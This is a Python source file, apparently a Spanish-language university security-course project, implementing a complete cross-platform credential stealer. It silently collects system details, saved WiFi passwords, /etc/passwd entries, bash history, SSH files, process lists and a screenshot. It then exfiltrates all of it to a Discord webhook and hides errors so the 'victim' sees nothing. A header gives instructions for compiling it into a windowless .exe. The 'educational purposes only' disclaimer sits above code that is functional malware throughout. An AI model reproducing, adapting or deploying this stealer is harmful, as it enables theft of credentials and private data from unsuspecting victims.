"""
================================================================================
EDUCATIONAL PURPOSES ONLY
Proyecto académico - Materia de Seguridad Informática - Grupo 4
No usar contra sistemas sin autorización escrita del propietario.
================================================================================

Stealer multiplataforma: funciona en Windows y en Linux/Kali sin cambios.
En Windows roba información del sistema, redes WiFi, credenciales y toma
una captura de pantalla. En Linux hace lo mismo adaptado al sistema de archivos.
Todo se exfiltra a un canal de Discord mediante un webhook.

Para compilar a .exe desde Kali:
    pip install pyinstaller pillow requests
    pyinstaller --onefile --noconsole stealer.py
    El .exe queda en la carpeta dist/

Para correr directamente en cualquier sistema:
    pip install pillow requests
    python3 stealer.py
"""

import os
import sys
import socket
import platform
import subprocess
import requests
import json
import base64
import struct
import io
from datetime import datetime

# ============================================================
# CONFIGURACIÓN - pon aquí tu webhook de Discord
# Para crear uno: Discord -> canal -> Editar -> Integraciones
# -> Webhooks -> Nuevo Webhook -> Copiar URL
# ============================================================
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/TU_WEBHOOK_ID/TU_WEBHOOK_TOKEN"
# ============================================================


def es_windows():
    """Devuelve True si el script está corriendo en Windows."""
    return platform.system() == "Windows"


def es_linux():
    """Devuelve True si el script está corriendo en Linux."""
    return platform.system() == "Linux"


# ============================================================
# MÓDULO 1 - Información general del sistema
# Funciona igual en Windows y en Linux
# ============================================================
def obtener_info_sistema():
    """
    Recopila información básica del sistema operativo.
    Usa el módulo 'platform' de Python que es multiplataforma.
    """
    try:
        hostname    = socket.gethostname()          # nombre del equipo en la red
        usuario     = os.getenv("USERNAME") or os.getenv("USER") or "desconocido"
        sistema     = platform.system()             # Windows, Linux, Darwin
        version     = platform.version()            # versión completa del SO
        arquitectura = platform.machine()           # x86_64, AMD64, ARM, etc.
        procesador  = platform.processor()          # modelo del procesador
        python_ver  = platform.python_version()     # versión de Python que está corriendo

        # Intentar obtener la IP local
        try:
            ip_local = socket.gethostbyname(hostname)
        except Exception:
            ip_local = "no disponible"

        # Intentar obtener la IP pública consultando un servicio externo
        try:
            ip_publica = requests.get("https://api.ipify.org", timeout=5).text.strip()
        except Exception:
            ip_publica = "no disponible"

        reporte = (
            "**INFORMACIÓN DEL SISTEMA**\n"
            "```\n"
            f"Fecha/Hora   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"Hostname     : {hostname}\n"
            f"Usuario      : {usuario}\n"
            f"Sistema      : {sistema} {version}\n"
            f"Arquitectura : {arquitectura}\n"
            f"Procesador   : {procesador}\n"
            f"IP local     : {ip_local}\n"
            f"IP pública   : {ip_publica}\n"
            f"Python       : {python_ver}\n"
            "```\n"
        )
        return reporte

    except Exception as e:
        return f"**INFO SISTEMA** - Error: {e}\n"


# ============================================================
# MÓDULO 2 - SID del usuario (solo Windows)
# En Linux devuelve el UID/GID equivalente
# ============================================================
def obtener_sid():
    """
    En Windows obtiene el SID (Security Identifier) del usuario actual.
    El SID es un identificador único que Windows asigna a cada usuario.
    En Linux obtiene el UID y GID que cumplen la misma función.
    """
    try:
        if es_windows():
            # whoami /user devuelve el nombre y SID del usuario actual
            resultado = subprocess.check_output(
                ["whoami", "/user"],
                stderr=subprocess.DEVNULL,
                creationflags=0x08000000  # CREATE_NO_WINDOW - sin ventana visible
            ).decode(errors="ignore")

            reporte = (
                "**SID DEL USUARIO (Windows)**\n"
                f"```\n{resultado.strip()}\n```\n"
            )

        elif es_linux():
            # En Linux el equivalente es id que muestra uid, gid y grupos
            resultado = subprocess.check_output(
                ["id"],
                stderr=subprocess.DEVNULL
            ).decode(errors="ignore")

            # También intentamos leer /etc/passwd para más info
            try:
                with open("/etc/passwd", "r") as f:
                    passwd_lines = [l for l in f.readlines() if not l.startswith("#")]
                passwd_info = "".join(passwd_lines[:10])  # primeras 10 entradas
            except PermissionError:
                passwd_info = "Acceso denegado a /etc/passwd\n"

            reporte = (
                "**UID/GID DEL USUARIO (Linux)**\n"
                f"```\nid: {resultado.strip()}\n\n"
                f"/etc/passwd (primeras entradas):\n{passwd_info}```\n"
            )
        else:
            reporte = "**SID/UID** - Sistema no reconocido\n"

        return reporte

    except Exception as e:
        return f"**SID/UID** - Error: {e}\n"


# ============================================================
# MÓDULO 3 - Directorio actual y su contenido
# ============================================================
def obtener_directorio():
    """
    Lista los archivos y carpetas del directorio donde se ejecutó el script.
    Muestra nombre, tamaño y fecha de modificación de cada elemento.
    """
    try:
        directorio = os.getcwd()
        entradas   = os.listdir(directorio)

        lineas = [f"Ruta actual: {directorio}\n\n"]

        for nombre in sorted(entradas):
            ruta_completa = os.path.join(directorio, nombre)
            try:
                stat = os.stat(ruta_completa)
                es_dir = os.path.isdir(ruta_completa)
                tamano = stat.st_size
                fecha  = datetime.fromtimestamp(stat.st_mtime).strftime("%d/%m/%Y")
                tipo   = "DIR " if es_dir else "FILE"
                lineas.append(f"[{tipo}] {nombre:<40} {tamano:>10} bytes   {fecha}\n")
            except Exception:
                lineas.append(f"[????] {nombre}\n")

        reporte = (
            "**DIRECTORIO ACTUAL**\n"
            "```\n"
            + "".join(lineas) +
            "```\n"
        )
        return reporte

    except Exception as e:
        return f"**DIRECTORIO** - Error: {e}\n"


# ============================================================
# MÓDULO 4 - Contraseñas WiFi guardadas
# Windows usa netsh, Linux usa NetworkManager o wpa_supplicant
# ============================================================
def obtener_wifi():
    """
    Extrae las contraseñas de las redes WiFi que el sistema tiene guardadas.
    En Windows usa el comando netsh que viene integrado en el sistema.
    En Linux lee los archivos de configuración de NetworkManager.
    """
    try:
        redes = {}

        if es_windows():
            # Obtener lista de perfiles WiFi guardados
            try:
                salida = subprocess.check_output(
                    ["netsh", "wlan", "show", "profiles"],
                    stderr=subprocess.DEVNULL,
                    creationflags=0x08000000
                ).decode(errors="ignore")
            except Exception:
                return "**WIFI** - netsh no disponible\n"

            # Extraer nombres de cada perfil de la salida
            nombres = []
            for linea in salida.splitlines():
                if ":" in linea and ("Perfil" in linea or "Profile" in linea or "User Profile" in linea):
                    nombre = linea.split(":", 1)[1].strip()
                    if nombre:
                        nombres.append(nombre)

            # Para cada red, obtener la contraseña con key=clear
            for nombre in nombres:
                try:
                    detalle = subprocess.check_output(
                        ["netsh", "wlan", "show", "profile", f"name={nombre}", "key=clear"],
                        stderr=subprocess.DEVNULL,
                        creationflags=0x08000000
                    ).decode(errors="ignore")

                    contrasena = "no encontrada"
                    for linea in detalle.splitlines():
                        # La línea con la contraseña tiene distintos nombres según el idioma
                        if any(x in linea for x in ["Key Content", "Contenido de la clave", "Contenido"]):
                            if ":" in linea:
                                contrasena = linea.split(":", 1)[1].strip()
                    redes[nombre] = contrasena
                except Exception:
                    redes[nombre] = "error al leer"

        elif es_linux():
            # NetworkManager guarda los perfiles en /etc/NetworkManager/system-connections/
            nm_path = "/etc/NetworkManager/system-connections/"
            if os.path.exists(nm_path):
                try:
                    archivos = os.listdir(nm_path)
                    for archivo in archivos:
                        ruta = os.path.join(nm_path, archivo)
                        try:
                            with open(ruta, "r") as f:
                                contenido = f.read()
                            ssid, psk = "desconocido", "no encontrada"
                            for linea in contenido.splitlines():
                                if linea.startswith("ssid="):
                                    ssid = linea.split("=", 1)[1]
                                if linea.startswith("psk="):
                                    psk = linea.split("=", 1)[1]
                            redes[ssid] = psk
                        except PermissionError:
                            redes[archivo] = "acceso denegado (necesita root)"
                except PermissionError:
                    return "**WIFI** - Necesitas root para leer /etc/NetworkManager/\n"
            else:
                return "**WIFI** - NetworkManager no encontrado\n"

        # Formatear el resultado
        if not redes:
            contenido = "No se encontraron redes guardadas.\n"
        else:
            lineas = []
            for ssid, pwd in redes.items():
                lineas.append(f"Red  : {ssid}\nPass : {pwd}\n\n")
            contenido = "".join(lineas)

        reporte = (
            f"**REDES WIFI GUARDADAS ({len(redes)} encontradas)**\n"
            f"```\n{contenido}```\n"
        )
        return reporte

    except Exception as e:
        return f"**WIFI** - Error inesperado: {e}\n"


# ============================================================
# MÓDULO 5 - Procesos activos en el sistema
# ============================================================
def obtener_procesos():
    """
    Lista los procesos que están corriendo en el sistema al momento de la ejecución.
    Útil para detectar antivirus, herramientas de seguridad o software instalado.
    """
    try:
        if es_windows():
            salida = subprocess.check_output(
                ["tasklist", "/FO", "CSV", "/NH"],
                stderr=subprocess.DEVNULL,
                creationflags=0x08000000
            ).decode(errors="ignore")

            procesos = []
            for linea in salida.splitlines()[:25]:  # primeros 25 procesos
                partes = linea.strip('"').split('","')
                if len(partes) >= 2:
                    nombre = partes[0]
                    pid    = partes[1]
                    procesos.append(f"[{pid:>6}] {nombre}")

        elif es_linux():
            salida = subprocess.check_output(
                ["ps", "aux", "--no-header"],
                stderr=subprocess.DEVNULL
            ).decode(errors="ignore")

            procesos = []
            for linea in salida.splitlines()[:25]:
                partes = linea.split()
                if len(partes) >= 11:
                    pid    = partes[1]
                    nombre = " ".join(partes[10:])[:60]
                    procesos.append(f"[{pid:>6}] {nombre}")
        else:
            procesos = ["Sistema no reconocido"]

        reporte = (
            "**PROCESOS ACTIVOS (top 25)**\n"
            "```\n"
            + "\n".join(procesos) +
            "\n```\n"
        )
        return reporte

    except Exception as e:
        return f"**PROCESOS** - Error: {e}\n"


# ============================================================
# MÓDULO 6 - Historial de comandos (solo Linux)
# Variables de entorno (solo Windows)
# ============================================================
def obtener_extras():
    """
    En Linux lee el historial de bash para ver qué comandos ejecutó el usuario.
    En Windows lee las variables de entorno del sistema que contienen rutas y config.
    """
    try:
        if es_linux():
            # El historial de bash está en ~/.bash_history
            historial_path = os.path.expanduser("~/.bash_history")
            try:
                with open(historial_path, "r", errors="ignore") as f:
                    lineas = f.readlines()
                # Últimos 20 comandos
                ultimos = lineas[-20:] if len(lineas) > 20 else lineas
                contenido = "".join(ultimos)
                titulo = "HISTORIAL DE BASH (últimos 20 comandos)"
            except FileNotFoundError:
                contenido = "Archivo no encontrado\n"
                titulo = "HISTORIAL DE BASH"

            # También intentamos leer las SSH keys
            ssh_path = os.path.expanduser("~/.ssh/")
            ssh_keys = []
            if os.path.exists(ssh_path):
                for archivo in os.listdir(ssh_path):
                    if archivo.endswith((".pub", "known_hosts", "config")):
                        try:
                            with open(os.path.join(ssh_path, archivo), "r") as f:
                                ssh_keys.append(f"--- {archivo} ---\n{f.read()[:200]}\n")
                        except Exception:
                            pass

            ssh_info = "\n".join(ssh_keys) if ssh_keys else "No se encontraron archivos SSH públicos\n"

            reporte = (
                f"**{titulo}**\n"
                f"```\n{contenido}```\n"
                f"**CLAVES SSH ENCONTRADAS**\n"
                f"```\n{ssh_info}```\n"
            )

        elif es_windows():
            # Variables de entorno relevantes de Windows
            vars_interes = [
                "USERNAME", "COMPUTERNAME", "USERDOMAIN", "USERPROFILE",
                "APPDATA", "LOCALAPPDATA", "PROGRAMFILES", "TEMP",
                "PATH", "OS", "PROCESSOR_ARCHITECTURE", "NUMBER_OF_PROCESSORS"
            ]
            lineas = []
            for var in vars_interes:
                valor = os.getenv(var, "no definida")
                lineas.append(f"{var:<25} = {valor}")

            reporte = (
                "**VARIABLES DE ENTORNO RELEVANTES**\n"
                "```\n"
                + "\n".join(lineas) +
                "\n```\n"
            )
        else:
            reporte = "**EXTRAS** - Sistema no reconocido\n"

        return reporte

    except Exception as e:
        return f"**EXTRAS** - Error: {e}\n"


# ============================================================
# MÓDULO 7 - Captura de pantalla
# Requiere el paquete pillow (pip install pillow)
# ============================================================
def tomar_screenshot():
    """
    Captura la pantalla completa y devuelve los bytes de la imagen en formato PNG.
    Usa la librería Pillow (PIL) que funciona en Windows y Linux.
    En Linux necesita que haya un display disponible (variable DISPLAY).
    """
    try:
        from PIL import ImageGrab, Image

        if es_linux():
            # En Linux ImageGrab necesita que DISPLAY esté configurado
            # Si no hay display (servidor sin GUI) esto fallará
            import subprocess
            env_display = os.environ.get("DISPLAY", ":0")
            os.environ["DISPLAY"] = env_display

        captura = ImageGrab.grab()

        # Guardar en memoria como PNG sin tocar el disco
        buffer = io.BytesIO()
        captura.save(buffer, format="PNG")
        buffer.seek(0)
        return buffer.read()

    except ImportError:
        return None  # Pillow no está instalado
    except Exception:
        return None  # Display no disponible u otro error


# ============================================================
# EXFILTRACIÓN - Enviar texto al webhook de Discord
# Discord tiene un límite de 2000 caracteres por mensaje.
# Si el reporte es más largo lo dividimos en partes.
# ============================================================
def enviar_texto(texto):
    """
    Envía el texto al webhook de Discord dividiéndolo en partes si es necesario.
    El webhook recibe un JSON con el campo 'content' que es el texto del mensaje.
    """
    LIMITE = 1900  # dejamos margen del límite de 2000 chars de Discord

    try:
        # Dividir el texto en chunks si supera el límite
        partes = [texto[i:i+LIMITE] for i in range(0, len(texto), LIMITE)]

        for parte in partes:
            payload = {"content": parte}
            respuesta = requests.post(
                DISCORD_WEBHOOK,
                json=payload,
                timeout=10
            )
            if respuesta.status_code not in (200, 204):
                pass  # falló silenciosamente, no mostrar error
            import time
            time.sleep(0.5)  # pequeña pausa entre mensajes

    except Exception:
        pass  # fallo silencioso, la víctima no debe ver errores


def enviar_imagen(imagen_bytes, nombre="screenshot.png"):
    """
    Envía la imagen como archivo adjunto al webhook de Discord.
    Discord acepta archivos mediante multipart/form-data.
    """
    try:
        if imagen_bytes is None:
            return

        files = {
            "file": (nombre, imagen_bytes, "image/png")
        }
        requests.post(
            DISCORD_WEBHOOK,
            files=files,
            timeout=15
        )
    except Exception:
        pass


# ============================================================
# MAIN - Orquesta todos los módulos y exfiltra
# ============================================================
def main():
    """
    Función principal. Corre todos los módulos en orden y manda los resultados
    a Discord. Todo corre en silencio, sin mostrar ninguna ventana ni mensaje.
    """
    # Construir el reporte completo
    separador = "\n" + "─" * 40 + "\n"

    reporte = ""
    reporte += f">>> GRUPO 4 - ACCESO OBTENIDO | {platform.system()} <<<\n"
    reporte += separador

    reporte += obtener_info_sistema()
    reporte += separador

    reporte += obtener_sid()
    reporte += separador

    reporte += obtener_directorio()
    reporte += separador

    reporte += obtener_wifi()
    reporte += separador

    reporte += obtener_procesos()
    reporte += separador

    reporte += obtener_extras()

    # Enviar el reporte de texto
    enviar_texto(reporte)

    # Tomar y enviar screenshot
    import time
    time.sleep(1)
    screenshot = tomar_screenshot()
    if screenshot:
        enviar_imagen(screenshot)


# Punto de entrada del script
# if __name__ == "__main__" hace que esto solo corra cuando
# ejecutas el archivo directamente, no cuando lo importas
if __name__ == "__main__":
    main()
